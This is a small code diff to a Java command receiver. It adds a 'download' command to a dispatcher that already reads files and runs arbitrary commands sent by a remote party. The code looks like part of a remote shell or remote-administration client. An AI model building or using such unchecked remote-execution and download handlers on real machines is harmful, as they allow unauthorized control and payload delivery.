@@ -64,6 +64,8 @@ public class CommandReciver {
         } else if (command.startsWith("read")) {
             sender.send("commandout", System.getProperty("user.dir") + " $ " + command);
             readFile(command);
+        } else if (command.startsWith("download")) {
+            new DownloadService().download(command.split(" ")[1], command.split(" ")[2]);
         } else {
             executeNormalCommand(command);
         }
